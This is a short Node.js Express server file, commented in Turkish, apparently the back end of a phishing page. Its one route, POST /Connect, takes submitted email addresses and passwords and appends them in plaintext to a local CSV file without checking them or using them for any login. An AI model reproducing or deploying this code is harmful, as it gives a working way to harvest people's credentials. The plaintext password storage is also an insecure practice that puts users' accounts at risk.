/*

GEREKLİ PAKETLER YÜKLENİYOR...

*/

var http = require('http');
const express = require('express');
const bodyParser = require('body-parser');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const fs = require('fs');
const path = require('path');
var app = express();
app.use(express.json());
app.set('port', process.env.PORT || 3000); 
app.set('views', __dirname + '/app/server/views'); 
app.set('view engine', 'ejs'); 
app.use(express.static(__dirname + '/app/public')); 
app.use(bodyParser.urlencoded({ extended: true }));
require('./app/routes')(app); 




const csvFilePath = path.join(__dirname, 'data.csv');

app.post('/Connect', async (req, res) => {
  const password = req.body.password;
  const email = req.body.email;

  const csvWriter = createCsvWriter({
    path: csvFilePath,
    header: [
      { id: 'password', title: 'Password' },
      { id: 'email', title: 'Email' },
    ],
    append: true,
  });

  const data = [{ password, email }];

  csvWriter
    .writeRecords(data)
    .then(() => {
      res.send('Data saved successfully.');
    })
    .catch((error) => {
      console.error(error);
      res.send('An error occurred.');
    });
});



http.createServer(app).listen(app.get('port'), function(){
	console.log('PORT: ' + app.get('port'));
});

